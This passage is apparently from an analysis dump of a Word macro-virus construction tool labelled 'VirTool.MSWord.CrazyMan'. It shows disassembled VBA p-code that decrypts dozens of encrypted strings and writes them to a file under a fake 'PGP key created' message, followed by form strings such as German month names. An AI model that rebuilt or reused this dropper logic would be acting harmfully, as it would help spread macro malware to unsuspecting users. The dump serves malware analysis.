' 	LitStr 0x0040 "¼ó—ð—ëÉÎ²Ø‘±ì»òÛ÷öÝ±Úò¶€ÄØ˜áïþ»ßó†Ëó¾ô§“’âµŽ­á‡¾©òÑŠ“Ã½£šóŠçüëï³"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0047 
' 	ArgsSt ASCModul 0x0001 
' Line #645:
' 	LitStr 0x0040 "–â—ÆˆÀùÓ±úÇ²¸Ü¦Íÿ ŸÄ÷á…ÀöÜÉÝÒÊ¨¼â”Ä•¿ûŸžþâÍÛ®ì�º«€æÞˆØ�Îäè³õáÉ•È"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0048 
' 	ArgsSt ASCModul 0x0001 
' Line #646:
' 	LitStr 0x0040 "¢æ–õ†ÉùÒõÖ…©íÂ¡¢ýÊþ£ýÙ§Ñö²™¨±¾èØ­—ã×ðØÜÔñ½µà³´ÆÃ—øãŸˆØˆŸ…ü’ýÂ�ñÐ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0049 
' 	ArgsSt ASCModul 0x0001 
' Line #647:
' 	LitStr 0x0040 "…Áœø€˜ÏŠ÷ãœ¬úå…ÃæÒû ÷ê›†Í¾ÂÓÅ¸›øÌ¯ÕüÔ¶¯‹šÂóÊ˜æ½Ž¡ÁçÞÄ€ÿŒø¦–ßÅ×”ö"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x004A 
' 	ArgsSt ASCModul 0x0001 
' Line #648:
' 	LitStr 0x0040 "»È…üˆÏìŠ¯û°”ÜååÒÞøÙ›âõöÇû¥Çþûú´ä£‰ëÂÜÇ‹´ã¼òì–ãÄ²æ‚»ÞëÌµˆºí…ÿÚÊ–ì"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x004B 
' 	ArgsSt ASCModul 0x0001 
' Line #649:
' 	LitStr 0x0040 "ÿüƒ×â›˜�ÏúŠ�§â¬þßÛ�¸ýÄ÷‡ÙºÂÝéæµçï†¦ÐàÍÝË®ÝÑÝ°èË™�ìÝ ß˜¸”¸í¦ÕƒÝ×¯"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x004C 
' 	ArgsSt ASCModul 0x0001 
' Line #650:
' 	LitStr 0x0040 "»ä–ê†”—ÎñÁ ¡å¤³¬Ÿ¶ƒ½ä÷°Ü„¸ØÒëü˜ÿÆ®Çüçéµ™ƒ¶óÍòÛ”¸‰Çé–Äç£œ­Ñ�ÖÍÂ� "
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x004D 
' 	ArgsSt ASCModul 0x0001 
' Line #651:
' 	LitStr 0x0040 "ªñ–øçœõèã¼Ü•þÄ®õÃÁÑ‘ÐÄñåŒ…üãñ¹¥Ù £¦Ò²ë��‰µø‰ªÛ´‰‡ÐáÃæç§Ÿà¨¢ÀòÑÓò"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x004E 
' 	ArgsSt ASCModul 0x0001 
' Line #652:
' 	LitStr 0x0040 "šú–¬›�ÛõòÂ‡›£¬¼µìÒö¼þ”ñÅí»›þÅ¾â×ó¯º�ð¤Ý™çÜã—�À–™µîÓ ”Ã´Áý¨”ËÎÎÔ³"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x004F 
' 	ArgsSt ASCModul 0x0001 
' Line #653:
' 	LitStr 0x0040 "þÊ µžæÛôò¹šìàó£Èï¶ƒ‘Ã�úòç†�ôÒÜþö¾ˆ¤ëÈìÂŠñÀÂÝ¥Ú¡¢”ÚàˆÌûûˆ §³ÊÆðé¡"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0050 
' 	ArgsSt ASCModul 0x0001 
' Line #654:
' 	LitStr 0x0040 "–ª¾Õ›çêÿÃåšªïÕ¥õÂöñÒý˜ŒëÖ Ä¬Åä¹ÿ÷Õ¥È¾é›Ô‰«å—øéÀÙ—Ýþ‡Á–´¶ùæÄÌœ�•þ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0051 
' 	ArgsSt ASCModul 0x0001 
' Line #655:
' 	LitStr 0x0040 "«óšÛàè÷î·Á†ºÂÓ¨ãçËÄ�þÂòýÙ»ÈÈîø§þý‹óÇó¨º§ÿö×�¤ï¶Ð¾‡¾‚×››�¤þŠ–ùƒ’é"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0052 
' 	ArgsSt ASCModul 0x0001 
' Line #656:
' 	LitStr 0x0040 "·â£Õ¹›ÇÓÖÛØ”úå’ÕÂíõÙ‡Òªß’€ïÖóæéÃÚ“©àË²Þ”úöÙé¦ï�„¯�Ü´Å÷¢­¥æ‰�ÕóÐÉ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0053 
' 	ArgsSt ASCModul 0x0001 
' Line #657:
' 	LitStr 0x0040 "¡ÓÚ¯²Â÷ë³Á‚ðß¦»«”ýè�ÆÓ˜Ç……ç¨ÃÍ·ä¤Ñ÷–­ß�Í¼ðàË”õºŠŸÆÍªîÁµ›¦­„Ñ˜ÒÍè"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0054 
' 	ArgsSt ASCModul 0x0001 
' Line #658:
' 	LitStr 0x0040 "™ð–íàãÓñÊàÅ§Îç’ã�²êÙÔÃ¸Áå±€ÌØçŸ§ü•èô²Î¨Ðÿ±ÔôïÞ‡ÜƒƒêÚóßùŒ�Ï…ìÁƒò "
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0055 
' 	ArgsSt ASCModul 0x0001 
' Line #659:
' 	LitStr 0x0040 "›ôÜÿèœÌÒëâŸ¢ßÆ¾àØúÃ�ã‘ô�ø�à°ïê�ùÏ’ÂæÀÏ¿­�áäÙ†Ë´®ŒöÙ¾õþ�¬žÊ¥äñÚäò"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0056 
' 	ArgsSt ASCModul 0x0001 
' Line #660:
' 	LitStr 0x0040 "¾ùƒï�Æ–Ðè£†èæ¤¸ÊÝüÑ¾ÚÆ¡Âðšßí²Ã¦¤äµÝË­×‹”£¶®€‚ïÙÞüÖÆžÅø–¯øù¾œ„ŽÃ "
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0057 
' 	ArgsSt ASCModul 0x0001 
' Line #661:
' 	LitStr 0x0040 " ú�ò¤Ÿ’ÆÏõ½õùõø­Ïáè�äòõéøÄÅôõé³Ëû¶©á³ÎØ�€âÒÀ¦ÁÊºþÍÆ•ˆâ¶·äè±æÅùšÌ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0058 
' 	ArgsSt ASCModul 0x0001 
' Line #662:
' 	LitStr 0x0040 "äÛ€Ò´þÀÉùîÆ…»÷†£œÎÂ…�“ºÑØÄèâÚí¶Ä£ÏéÆÒñ‡Ô†ÝÕ÷ºÀ¥±¦ß ˜áëŽš¸ê‘ÿáÝå "
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0059 
' 	ArgsSt ASCModul 0x0001 
' Line #663:
' 	LitStr 0x0040 "¶§¶Ø¹”�ý´ú¤‹æÇ�Ù‚ýè˜ýÑ—êÒ…›ÓøØæûÇ²ÃðÃÛ«¹ŽÅÉ—òÔ™©žÃÚ½âþ…¸ˆè¥æøü—Þ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x005A 
' 	ArgsSt ASCModul 0x0001 
' Line #664:
' 	LitStr 0x0040 "€õ¾Ò‘ÛèüÁÍœ‰ÍÓŒÉÛ¬ÇŒú�—„Þ¤âÆíÆ„Åò¦ËÑ³«ž…¾Ð²Üšì³…›�Î¤êÞ¢¬ŠÔ´éôÍõü"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x005B 
' 	ArgsSt ASCModul 0x0001 
' Line #665:
' 	LitStr 0x0040 "ýê©ý—þã�Êß€…ßðá¯™ª‡œŽÒ“Áé ÇýæÈ‡êÜ¦ßÓä¯£��Àùö¡Õ¼Ø—ìÁ¸Äèõ“ª¯²ÕÕü›ª"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x005C 
' 	ArgsSt ASCModul 0x0001 
' Line #666:
' 	LitStr 0x0040 "•Êƒè´ÿ”ˆåáÇ¶Ñ¦óîýöÛªå×“âø¦âÆÁø„ÐÚ²¾ÁÃÜ¼³‰óÈú�Ì�¢ˆóÍ¿Ñš»ž‡¯¥’þ÷ÅÙ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x005D 
' 	ArgsSt ASCModul 0x0001 
' Line #667:
' 	LitStr 0x0040 "¡¡ºÐˆÛè‰ñ¼§§ìÎ³ëÛýÈ¥™òðÀÎ�Î±ÃÄ’ÅóÖØ–¶ÿ ¾úõãÂ¨ù½ß»Œá‚ÔÇ��˜Ó›àóêó¬"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x005E 
' 	ArgsSt ASCModul 0x0001 
' Line #668:
' 	LitStr 0x0040 "­ùºÏ•îàÿ«Þš¤îø¥ÝôÁÀ¯ÝêšÐÿ ÒÏêú©û¢­ âÎêÚ¦üÏÏ�¸þœ‹¨ÓþŸ’ëã“™ï£—úþÒÌ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x005F 
' 	ArgsSt ASCModul 0x0001 
' Line #669:
' 	LitStr 0x0040 "þ¡˜Ý–ÇÈÿôÞ«¯ÃÎ§êÃîÔÛ†�íÙÒ”üÐËÊçÊÏ‚ûýÂøÙ®�åôŠ†õŠºÿòÏ§îÃ¨½€ýÆó�ýûê"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0060 
' 	ArgsSt ASCModul 0x0001 
' Line #670:
' 	LitStr 0x0040 "€Ú‡ý“•×ŠÔÉÀ•¼¢ºÝ×ÉÆ¤ð‹¥ÂÓ¥ùï¶»‚ãÁÙÖàîÖ…Ê¼ñªè°½¼¯Žùé¡ï÷¨¡�Û˜îƒÈöï"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0061 
' 	ArgsSt ASCModul 0x0001 
' Line #671:
' 	LitStr 0x0040 "ùÛÛÊŠ™Åñëä½«±à¼èçÈ„³™Æ£ê„ÏÃ¿çí“êÝ´ù•­²�½«¼Òü…Þ«šœ†Ï¨“„¦®ˆéÂÍüøûÔ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0062 
' 	ArgsSt ASCModul 0x0001 
' Line #672:
' 	LitStr 0x0040 "½ã‚ë£žôîïë±—Éõˆ¢œèÅ�óÈõ…ùŽÙÈÊ¼‚ÖÁØãÞÀ²¢”™Ëïàðã—ÚœÝ»¯éÜ‰”²­˜ÀÙãÛÁ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0063 
' 	ArgsSt ASCModul 0x0001 
' Line #673:
' 	LitStr 0x0040 "ŒÃžÐ¶Å’ÊµÊÂö±ð™Éù¬Ã²ÜÖµÂÍÇß¿Ïù‹ÐÃ×òíàêŠ§«õÊŽñüž«õÃÓƒŒù�«„ÊÛ—�ì”­"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0064 
' 	ArgsSt ASCModul 0x0001 
' Line #674:
' 	LitStr 0x0040 "œèˆùâËæÐÖý¾–¾ÍóÛûÿàºô˜ ÿìÁÆÒðéµÞÏ©Ëî­Ü”»¾ÓÙÈ†´¡€ý…ÏØžù Ÿø×ªöãÁ’¡"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0065 
' 	ArgsSt ASCModul 0x0001 
' Line #675:
' 	LitStr 0x0040 "¥ö™Ñ½Éçæëà��§ö£ïÉÜŸ­™è£‹ÚÏýÏÏÈ™Üó­ýÉ©åµÊ½«³ê˜þ‘ª¼ÀÅŽÉÀþž»Ç¹“†ùÐï"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0066 
' 	ArgsSt ASCModul 0x0001 
' Line #676:
' 	LitStr 0x0040 "¹¢¶ß‡ï×Ò¹Å™úßÑÿÐŸ¡€ŒÂêñØÖ¦ÈµãõŸàÚ¡ âÎÌÔÇ¡ÈÌÛ¦Ë�œ§Âé–Þüœ¸š°³ÉàÃËÖ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0067 
' 	ArgsSt ASCModul 0x0001 
' Line #677:
' 	LitStr 0x0040 "¥à›ÈºàÉÚÏÂ¾ó§Ì½Âû©ÿ�þòªÀŽ�æïÎÃ„âºšëÌõÎ�¾�ÆÆö¦Ä¡†ŽÚÇ»ÏÜ�½Œü—íüãÐÓ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0068 
' 	ArgsSt ASCModul 0x0001 
' Line #678:
' 	LitStr 0x0040 "£Ã•Ä¼ÜŠÌ°Íƒ’åã€Ý�î×ÒìÑ�×ì­€ääÃãÙÆ™ØþÌïœ�§è¶ü–è�ÑüÜè­æÈ…©äö˜“ûéáÿ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0069 
' 	ArgsSt ASCModul 0x0001 
' Line #679:
' 	LitStr 0x0040 "úý¸ÎœËÎÏ°þ¾�ýâåîÝãÈ¥ýÑ�ËíÀØâÃ¾³¦ðØÂÃ³û¡ÔŽÖ°é£ïÅÛæç½–Íõ�·øôÛÖáÙ•é"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x006A 
' 	ArgsSt ASCModul 0x0001 
' Line #680:
' 	LitStr 0x0040 "öè®î»ú’Ê±á…¥ðÛ£«ÔÊâ�Õç¡œÊ­ÿÏ×õ©ëÍµöÝéÌž¾�Êµ“ˆÜ¶¯½ßæÜžÄô»‘ë”ŠÁ÷Äà"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x006B 
' 	ArgsSt ASCModul 0x0001 
' Line #681:
' 	LitStr 0x0040 "ªÿ¤«¦úÓÑ¹õºû±äþÙáÎÁ½Ì÷ˆþ� ÒöìÎ·ßð¹×“´ö´‹£÷·Þ•Ô‚¥†å³¸ÏÍùËž­¨ã�íÏÜ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x006C 
' 	ArgsSt ASCModul 0x0001 
' Line #682:
' 	LitStr 0x0040 "ýóÄè±õðçÈ£¦ˆòûˆÍøüê¥òÚ˜ãÞ�ãÊöøá ú£ûÑþÎ«º±Òçýöø¾»âøàš×Ö¸°“Ý•áÍö‘×"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x006D 
' 	ArgsSt ASCModul 0x0001 
' Line #683:
' 	LitStr 0x0040 "ý¥¦÷´ÔùùÅÔÀ·òÆ«ÿÃÜ†€ùõ¤Þ‰Ø˜èÇÎ¨ªÛ‚ÓÃ¶É‡Î…ÇÛŽ¤ý£�„Ìáˆý›¶°˜õ�ÜÿÌÉ¯"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x006E 
' 	ArgsSt ASCModul 0x0001 
' Line #684:
' 	LitStr 0x0040 "µ¦¸«ãÆÓ�ëü¼÷ÒÝ™ÖïÓÖ­ßøª‡è°�¨ûìµñ¬¶ÿÍÂçÔ�çÌöïŽÚ¾‚ž† ßÔÊš‹§Ëš—íÍõÍ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x006F 
' 	ArgsSt ASCModul 0x0001 
' Line #685:
' 	LitStr 0x0040 "¤ÿ–Í�ûŽÔÎÜ¾—áõ¡ßãÀÅ¼î–¶ÞúŸßîÛíºýïšúðèðÔÇŠ½çÉµáËÚúŸÏ•“Ç–ªƒð†ôïýõÙ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0070 
' 	ArgsSt ASCModul 0x0001 
' Line #686:
' 	LitStr 0x0040 "› †ÓéáÕÇíÂÅ¹½¥§Ñ†Ñùºøâ”€�¾æ¬±é´«£´÷ãüÛ¢†€ü÷�„Ï‚ƒ€Ÿý¹–ù†�¹Ùß×ý�ÖÏ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0071 
' 	ArgsSt ASCModul 0x0001 
' Line #687:
' 	LitStr 0x0040 "›ÙÜèšÆðÏôÂÆûºÝ»óèËÙ›Ýò­Ë��áÅòÇéáÿŒÚ”Ô¬Õš¿Ó¸Ñ–è¤�¦øÉ«íÇ¡¨¨Ë�•ãÓšÖ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0072 
' 	ArgsSt ASCModul 0x0001 
' Line #688:
' 	LitStr 0x0040 "¡ûÜÓ¾œËŒâçÂ®ÉÜ“ÉÚ«È„…éòð�ŸìåÌ×çÐÌÒóåÈË‰™§òàÛôû™� ã¸…íÈ�¶‚®Á‘ãÃç³"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0073 
' 	ArgsSt ASCModul 0x0001 
' Line #689:
' 	LitStr 0x0040 "‚Ú–éåãËËÖ´ŸºýÍ¿øÏ­ã€Óä–ÙÏ˜ìÈ·ÿ™¥ÐŠåëïÌ¯¸ŠÆæê�ê³¯�åÂØÅÄ™¨ŠÞŸïòüäË"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0074 
' 	ArgsSt ASCModul 0x0001 
' Line #690:
' 	LitStr 0x0040 "¹§˜ùœœô‰åÙÃ‚æ¤’ã÷ûå€òé‰àï˜€î÷·ä÷§¦¢ôÉ¯Ùœ‰ÏÂÕø¹³»˜÷¸™æ–£ËŽæ¶ñðòêî"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0075 
' 	ArgsSt ASCModul 0x0001 
' Line #691:
' 	LitStr 0x0008 "Š¡ÙÉ…Ëœƒ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0076 
' 	ArgsSt ASCModul 0x0001 
' Line #692:
' 	LitStr 0x0005 "òó¨ê‡"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0077 
' 	ArgsSt ASCModul 0x0001 
' Line #693:
' 	LitStr 0x0022 "â¿Â³ýéïú Ü´“¨ÄŸØáÐóËýå›“ÿ»äÄÉ¢ü¾¸Í"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0078 
' 	ArgsSt ASCModul 0x0001 
' Line #694:
' 	Ld DateiName 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #695:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0078 
' 	For 
' Line #696:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld x 
' 	ArgsLd ASCModul 0x0001 
' 	PrintItemNL 
' Line #697:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #698:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #699:
' 	LitStr 0x0010 "PGP-Schlüssel: ""
' 	Ld DateiName 
' 	Concat 
' 	LitStr 0x0011 "" wurde erstellt."
' 	Concat 
' 	Ld vbInformation 
' 	Ld EsIstIch 
' 	ArgsCall MsgBox 0x0003 
' Line #700:
' 	ExitSub 
' Line #701:
' Line #702:
' 	Label fehler 
' Line #703:
' 	LitStr 0x0026 "Fehler bei der Schlüsselerstellung !!!"
' 	Ld vbCritical 
' 	Ld EsIstIch 
' 	ArgsCall MsgBox 0x0003 
' Line #704:
' 	EndSub 
' Line #705:
' Line #706:
' Line #707:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  Abbruchme.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   OK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������?���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dezember
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
November
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
April
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Oktober
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
September
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Februar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
August@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Januar@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jeder Monat
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i101/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jeder TagersOptionDayers
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OptionDay
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/FormDatum/i36/o'
